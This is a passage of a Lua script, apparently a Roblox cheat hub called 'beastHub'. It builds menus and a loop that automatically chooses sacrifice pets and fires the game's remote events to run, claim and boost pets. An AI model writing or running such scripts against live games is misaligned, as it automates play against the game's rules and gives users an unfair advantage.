                if type(machineMutations) ~= "table" then
                    warn("MachineMutationTypes not found in PetMutationRegistry.")
                    return {}
                end
                return machineMutations
            end

            -- Function you can call anytime to refresh pets data
            local function refreshPets()
                -- USAGE: local favs, unfavs = refreshPets()
                local pets = getPetInventory()
                local unfavoritePets = {}
                local machineMutationEnums = {} --pet mutation enums container
                local mutations = getMachineMutationsDataWithPrint()
                for enum, value in pairs(mutations) do --extract only enums
                    table.insert(machineMutationEnums, {enum, value})
                end        

                if pets then
                    for uid, pet in pairs(pets) do
                        local curMutation
                        local curMutationEnum = pet.PetData.MutationType or nil
                        --get current pet mutation via enum
                        for _, entry in ipairs(machineMutationEnums) do
                            local mutation = entry[2]
                            local enumId = entry[1]
                            if enumId == curMutationEnum then
                                curMutation = mutation
                                break
                            end
                        end
                        local entry = {
                            nameToId = pet.PetType.." | "..(curMutation or "Normal").." | Base KG: "..(string.format("%.2f", pet.PetData.BaseWeight * 1.1)).." | Age: "..tostring(pet.PetData.Level),
                            Uid = uid
                        }
                        if not pet.PetData.IsFavorite and pet.PetData.Level >= 100 then --filter only allowed age for breaker
                            table.insert(unfavoritePets, entry)
                        end
                    end
                end
                --
                return unfavoritePets
            end

            --process here
            local unfavs = refreshPets()

            -- Sort unfavs by nameToId BEFORE extracting namesOnly and idsOnly
            table.sort(unfavs, function(a,b)
                return a.nameToId < b.nameToId
            end)

            local namesOnly = {}
            idsOnly = {}

            for _, pet in ipairs(unfavs) do
                table.insert(namesOnly, pet.nameToId)
                table.insert(idsOnly, pet.Uid)
            end

            return namesOnly

        end

        Pets:CreateSection("Auto Pet Age Break")
        Pets:CreateParagraph({
            Title = "INSTRUCTIONS:",
            Content = "1.) Select Pet\n2.) Refresh list if pet not found\n3.) Ignore Target ID, it will auto populate"
        })
        local selectedPetForAgeBreaker = ""
        -- local paragraph_currentId = Pets:CreateParagraph({
        --     Title = "CURRENT ID:",
        --     Content = "None"
        -- })

        local petBreakerTargetIDstored = Pets:CreateDropdown({
            Name = "Target ID (do not change)",
            Options = {""},
            CurrentOption = {""},
            MultipleOptions = false,
            Flag = "petBreakerTargetStored",
            Callback = function() end,
        })

        local autoPetAgeBreakEnabled = false
        local autoPetAgeBreakThread = nil
        local selectedIndex = nil --to know which option is selected in order to get the Uid
        local selectTargetPetForBreaker = allPetsInInventory()

        local selectedPetForAgeBreak = Pets:CreateDropdown({
            Name = "Select Target (Unfavorite and 100+)",
            Options = selectTargetPetForBreaker,
            CurrentOption = {"None"},
            MultipleOptions = false,
            Flag = "AutPetAgeBreakTarget", 
            Callback = function(Options)
                local chosen = Options[1]
                -- print("=======chosen:")
                -- print(chosen)
                for i, v in ipairs(selectTargetPetForBreaker) do
                    -- print("looping")
                    -- print(v)
                    if v == chosen then
                        selectedIndex = i
                        break
                    end
                end
                selectedPetForAgeBreaker = idsOnly[selectedIndex]
                if selectedPetForAgeBreaker then
                    -- print("storing value")
                    -- print(selectedPetForAgeBreaker)
                    petBreakerTargetIDstored:Refresh({ selectedPetForAgeBreaker }) 
                    task.wait()
                    petBreakerTargetIDstored:Set({ selectedPetForAgeBreaker })
                    -- print("stored selectedPetForAgeBreaker to stored input")
                end
                if not selectedPetForAgeBreaker then
                    -- print("getting value from stored dropdown")
                    selectedPetForAgeBreaker = petBreakerTargetIDstored.CurrentOption[1] --stored value in rayfield
                    -- print("used pet id from stored input")
                    -- print(selectedPetForAgeBreaker)
                end

                -- paragraph_currentId:Set({
                --     Title = "CURRENT ID:",
                --     Content = selectedPetForAgeBreaker
                -- })  
            end,
        })

        Pets:CreateButton({
            Name = "Refresh List",
            Callback = function()
                local newList = allPetsInInventory()

                -- update main arrays
                selectTargetPetForBreaker = newList  -- update names
                -- idsOnly is already updated inside allPetsInInventory()

                -- refresh dropdown
                selectedPetForAgeBreak:Refresh(newList)

                -- optional: clear selection
                selectedPetForAgeBreak:Set({"None"})

                selectedIndex = nil
                selectedPetForAgeBreaker = nil
            end,
        })



        local petAgeKGsacrifice = Pets:CreateDropdown({
            Name = "Sacrifice Below Base KG:",
            Options = {"1", "2", "3"},
            CurrentOption = {"3"},
            MultipleOptions = false,
            Flag = "petAgeKGsacrifice", 
            Callback = function(Options)
            
            end,
        })


        local petAgeLevelSacrifice = Pets:CreateInput({
            Name = "Sacrifice Below Level:",
            CurrentValue = "",
            PlaceholderText = "input number..",
            RemoveTextAfterFocusLost = false,
            Flag = "petAgeLevelSacrifice",
            Callback = function(Text)
            -- The function that takes place when the input is changed
            -- The variable (Text) is a string for the value in the text box
            end,
        })

        Pets:CreateToggle({
            Name = "Auto Pet Age Break",
            CurrentValue = false,
            Flag = "autoPetAgeBreak", 
            Callback = function(Value)
                autoPetAgeBreakEnabled = Value
                local autoBreaker --function holder
                if not autoPetAgeBreakEnabled then
                    if autoPetAgeBreakThread then
                        task.cancel(autoPetAgeBreakThread)
                        autoPetAgeBreakThread = nil
                        beastHubNotify("Auto Pet Age Break stopped", "", 3)
                    end
                    return
                else
                    --turn off auto hatching of auto level is on
                    -- Toggle_smartAutoHatch:Set(false)
                    -- toggle_autoEle:Set(false)
                    -- toggle_autoNM:Set(false)
                    -- Toggle_autoLevel:Set(false)
                end

                --checking here
                -- Wait until Rayfield sets up the values (or timeout after 10s)
                local timeout = 3
                while timeout > 0 and (
                    not selectedPetForAgeBreak.CurrentOption
                    or not selectedPetForAgeBreak.CurrentOption[1]
                    or selectedPetForAgeBreak.CurrentOption[1] == "None"
                    or not tonumber(petAgeLevelSacrifice.CurrentValue)
                    or petAgeLevelSacrifice.CurrentValue == ""
                ) do
                    task.wait(1)
                    timeout -= 1
                end

                --checkers here, final check, works for sudden reconnection
                if not selectedPetForAgeBreak.CurrentOption
                or not selectedPetForAgeBreak.CurrentOption[1]
                or selectedPetForAgeBreak.CurrentOption[1] == "None" 
                or not tonumber(petAgeLevelSacrifice.CurrentValue)
                or petAgeLevelSacrifice.CurrentValue == "" then
                    beastHubNotify("Missing setup!", "Please recheck", 5)
                    return
                end

                local sacrificePetName = (selectedPetForAgeBreak.CurrentOption[1]:match("^(.-)%s*|") or ""):match("^%s*(.-)%s*$")
                -- local selectedId = idsOnly[selectedIndex]
                local selectedId = selectedPetForAgeBreaker


                autoBreaker = function(sacrificePetNameParam, selectedIdParam)
                    local function getPlayerData()
                        local dataService = require(game:GetService("ReplicatedStorage").Modules.DataService)
                        local logs = dataService:GetData()
                        return logs
                    end

                    local function getPetIdByNameAndFilterKg(name, basekg, belowLevel, exceptId)
                        -- print(name)
                        -- print(basekg)
                        -- print(belowLevel)
                        -- print(exceptId)
                        local playerData = getPlayerData()
                        if playerData.PetsData and playerData.PetsData.PetInventory and playerData.PetsData.PetInventory.Data then
                            for id, data in pairs(playerData.PetsData.PetInventory.Data) do
                                local curBaseKG = tonumber(string.format("%.2f", data.PetData.BaseWeight * 1.1))
                                if not data.PetData.IsFavorite and data.PetType == name and curBaseKG < basekg and id ~= exceptId and data.PetData.Level < belowLevel then
                                    return id
                                end
                            end
                            return nil
                        else
                            warn("PetsData not found!")
                            return nil
                        end
                    end

                    -- beastHubNotify("Selected: ",selectedPetForAgeBreak.CurrentOption[1], 3)


                    local petIdToSacrifice = getPetIdByNameAndFilterKg(sacrificePetNameParam, tonumber(petAgeKGsacrifice.CurrentOption[1]), tonumber(petAgeLevelSacrifice.CurrentValue), selectedIdParam)
                    -- print("petIdToSacrifice")
                    -- print(tostring(petIdToSacrifice)) 
                    
                    if petIdToSacrifice and autoPetAgeBreakEnabled then
                        beastHubNotify("Worthy sacrifice found!","",3)
                        task.wait(2)
                        --do the remotes here
                        --check if machine is ready, if same id, continue monitoring
                        local playerData = getPlayerData()
                        if playerData.PetAgeBreakMachine then
                            print("pet age breaker machine found")
                            if playerData.PetAgeBreakMachine.IsRunning then
                                print("breaker machine is already running")
                                local runningId = playerData.PetAgeBreakMachine.SubmittedPet.UUID
                                if runningId == selectedIdParam then
                                    print("the selected pet is already running in breaker machine")
                                    --wait until machine is done
                                else
                                    beastHubNotify("A different pet is already running", "waiting for breaker to be done", "3")
                                    --wait until machine is done
                                end

                                --monitor machine
                                while autoPetAgeBreakEnabled do 
                                    beastHubNotify("Waiting for breaker to be ready", "", 3)
                                    task.wait(30)
                                    playerData = getPlayerData()
                                    if not playerData.PetAgeBreakMachine.IsRunning then
                                        break
                                    end
                                end

                                --claim pet ready to claim
                                task.wait(1)
                                game:GetService("ReplicatedStorage").GameEvents.PetAgeLimitBreak_Claim:FireServer()
                                beastHubNotify("Pet claimed", "", 3)
                                return
                            else
                                local function equipPetByUuid(uuid)
                                    local player = game.Players.LocalPlayer
                                    local backpack = player:WaitForChild("Backpack")
                                    for _, tool in ipairs(backpack:GetChildren()) do
                                        if tool:GetAttribute("PET_UUID") == uuid then
                                            player.Character.Humanoid:EquipTool(tool)
                                        end
                                    end
                                end

                                print("breaker machine is not running and ready to use")
                                --claim if there is a pet ready to claim
                                if playerData.PetAgeBreakMachine.PetReady then
                                    game:GetService("ReplicatedStorage").GameEvents.PetAgeLimitBreak_Claim:FireServer()
                                    beastHubNotify("Claimed any pet that is ready", "", 3)
                                else
                                    --cancel pet not started
                                    game:GetService("ReplicatedStorage").GameEvents.PetAgeLimitBreak_Cancel:FireServer()
                                    beastHubNotify("Removed pet in breaker that was not started", "", 3)
                                end

                                --submit pet here
                                if autoPetAgeBreakEnabled then
                                    equipPetByUuid(selectedId)
                                    task.wait()
                                    game:GetService("ReplicatedStorage").GameEvents.PetAgeLimitBreak_SubmitHeld:FireServer()
                                    beastHubNotify("Target Pet submitted to breaker", "",3)
                                    task.wait(2)    
                                end
                                

                                --put sacrifice and start
                                if autoPetAgeBreakEnabled then
                                    --submit and start
                                    local args = {
                                        [1] = {
                                            [1] = petIdToSacrifice
                                        }
                                    }
                                    game:GetService("ReplicatedStorage").GameEvents.PetAgeLimitBreak_Submit:FireServer(unpack(args))
                                    beastHubNotify("Breaker machine started!", "", 3)
                                    task.wait(1)
                                end
                                

                                --monitor machine for newly submitted
                                while autoPetAgeBreakEnabled do 
                                    beastHubNotify("Waiting for breaker to be ready", "", 3)
                                    task.wait(30)
                                    playerData = getPlayerData()
                                    if not playerData.PetAgeBreakMachine.IsRunning then
                                        break
                                    end
                                end

                                --claim newly submitted pet in breaker
                                if autoPetAgeBreakEnabled then
                                    game:GetService("ReplicatedStorage").GameEvents.PetAgeLimitBreak_Claim:FireServer()
                                    beastHubNotify("Claimed ready pet in breaker", "", 3)
                                end

                            end
                        end
                    
                    else
                        beastHubNotify("No worthy sacrifice.", "", 3)
                        autoPetAgeBreakEnabled = false
                        autoPetAgeBreakThread = nil
                    end

                    
                    beastHubNotify("Auto Pet Age Break cycle done", "", 3)
                end

                --thread code here
                if autoPetAgeBreakEnabled and not autoPetAgeBreakThread then
                    autoPetAgeBreakThread = task.spawn(function()
                        while autoPetAgeBreakEnabled do
                            autoBreaker(sacrificePetName, selectedId)
                        end
                        
                    end) --end thread
                end 

                
            end,
        })
        Pets:CreateDivider()


        Pets:CreateSection("Other Pet settings")
        Pets:CreateButton({
            Name = "Boost All Pets using Held item",
            Callback = function()
                local function getPlayerData()
                    local dataService = require(game:GetService("ReplicatedStorage").Modules.DataService)
                    local HttpService = game:GetService("HttpService")
                    local logs = dataService:GetData()
                    local playerData = HttpService:JSONEncode(logs)
                    -- print(logs.PetsData.EquippedPets)
                    --setclipboard(playerData)
                    return logs.PetsData.EquippedPets
                end

                local data = getPlayerData()
                local ReplicatedStorage = game:GetService("ReplicatedStorage")
                local PetBoostService = ReplicatedStorage.GameEvents.PetBoostService -- RemoteEvent 
                    
                for _, id in ipairs(data) do
                    -- print(id)
                    PetBoostService:FireServer(
                        "ApplyBoost",
                        id
                    )
                    -- print("boosted!")
                end
            end,
        })
        Pets:CreateDivider()
    end

    
return M
